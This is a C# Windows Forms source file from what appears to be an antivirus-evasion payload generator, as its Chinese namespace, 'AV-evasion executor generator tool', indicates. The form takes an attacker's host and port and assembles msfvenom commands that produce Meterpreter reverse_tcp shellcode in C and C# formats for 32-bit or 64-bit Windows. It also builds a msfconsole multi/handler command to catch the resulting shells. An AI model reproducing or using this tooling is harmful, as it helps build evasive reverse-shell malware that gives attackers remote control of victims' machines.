using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace 掩日___免杀执行器生成工具
{
    public partial class Form2 : Form
    {
        public string pre = "windows/meterpreter/reverse_tcp";
        public string pre32 = "windows/meterpreter/reverse_tcp";
        public string pre64 = "windows/x64/meterpreter/reverse_tcp";
        public Form2()
        {
            InitializeComponent();
            if (Global_Var.arch == "x64")
            {
                checkBox1.Checked = true;
                pre = pre64;
                textBox2.Text = textBox2.Text.Replace(pre32, pre64);
                textBox3.Text = textBox3.Text.Replace(pre32, pre64);
                textBox4.Text = textBox4.Text.Replace(pre32, pre64);
            }
            else
            {
                checkBox1.Checked = false;
                pre = pre32;
                textBox2.Text = textBox2.Text.Replace(pre64, pre32);
                textBox3.Text = textBox3.Text.Replace(pre64, pre32);
                textBox4.Text = textBox4.Text.Replace(pre64, pre32);
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox2.Text = @"msfvenom -p " + pre + @" LHOST=" + textBox1.Text +" LPORT=" + textBox5.Text + " -f c";
            textBox3.Text = @"msfvenom -p " + pre + @" LHOST=" + textBox1.Text + " LPORT=" + textBox5.Text + " -f csharp";
            textBox4.Text = @"msfconsole -x ""use exploit/multi/handler;set payload " + pre + ";set lhost " + textBox1.Text + ";set lport " + textBox5.Text + ";run;\"";
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {
            textBox2.Text = @"msfvenom -p " + pre + @" LHOST=" + textBox1.Text + " LPORT=" + textBox5.Text + " -f c";
            textBox3.Text = @"msfvenom -p " + pre + @" LHOST=" + textBox1.Text + " LPORT=" + textBox5.Text + " -f csharp";
            textBox4.Text = @"msfconsole -x ""use exploit/multi/handler;set payload " + pre + ";set lhost " + textBox1.Text + ";set lport " + textBox5.Text + ";run;\"";
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                pre = pre64;
                textBox2.Text = textBox2.Text.Replace(pre32, pre64);
                textBox3.Text = textBox3.Text.Replace(pre32, pre64);
                textBox4.Text = textBox4.Text.Replace(pre32, pre64);
            }
            else
            {
                pre = pre32;
                textBox2.Text = textBox2.Text.Replace(pre64, pre32);
                textBox3.Text = textBox3.Text.Replace(pre64, pre32);
                textBox4.Text = textBox4.Text.Replace(pre64, pre32);
            }
        }
    }
}
